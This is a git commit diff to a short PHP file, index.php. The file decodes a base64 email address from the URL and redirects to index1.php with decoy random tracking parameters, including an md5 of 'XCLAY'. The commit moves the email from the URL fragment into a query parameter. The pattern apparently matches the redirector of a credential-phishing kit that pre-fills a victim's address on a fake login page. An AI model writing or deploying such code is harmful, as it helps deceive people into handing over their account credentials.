ca59fcbabb39ac73c478e60ab5856faa73bc03e2
creative212 <64727340+creative212@users.noreply.github.com>
2020-10-30 00:39:21 +0100

    Update index.php

--- index.php
+++ index.php
@@ -4,9 +4,9 @@ if(isset($_GET['email']) && !empty($_GET['email'])){
 $email = $_GET['email'];
 $email=base64_decode($email);
 
-header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."#".$email);
+header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
 }else{
-header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."#".$email);
+header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
 }
 
 ?>
